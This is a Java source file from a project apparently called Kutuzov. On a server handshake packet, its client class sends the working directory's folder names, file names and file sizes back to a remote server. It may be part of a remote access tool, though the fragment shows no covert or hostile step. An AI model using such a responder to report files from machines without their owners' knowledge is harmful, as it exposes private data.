package me.kutuzov.client;

import me.kutuzov.entry.SerializableEntry;
import me.kutuzov.packet.Packet;
import me.kutuzov.packet.kftp.CSKFTPDirectoryInfoPacket;
import me.kutuzov.packet.kftp.SCKFTPHandshakePacket;

import java.io.File;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Map;

public class KutuzovKFTPPackets {
    private static SerializableEntry<String, Long>[] buildEntry(SerializableEntry<String, Long>... entry) { return entry; }

    private static String directory = "";
    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCKFTPHandshakePacket) {
            directory = System.getProperty("user.dir");
            File file = new File(directory);
            String[] directories = file.list((current, name) -> new File(current, name).isDirectory());
            String[] files = file.list((current, name) -> new File(current, name).isFile());
            ArrayList<SerializableEntry<String, Long>> entries = new ArrayList<>();
            for(String fileString : files)
                try {
                    entries.add(new SerializableEntry<>(fileString, Files.size(Paths.get(fileString))));
                } catch (Exception e) { entries.add(new SerializableEntry<>(fileString, -1L)); }

            try {
                oos.writeObject(new CSKFTPDirectoryInfoPacket(directory, directories, entries.toArray(buildEntry())));
            } catch (Exception e) { }
        }
    }
}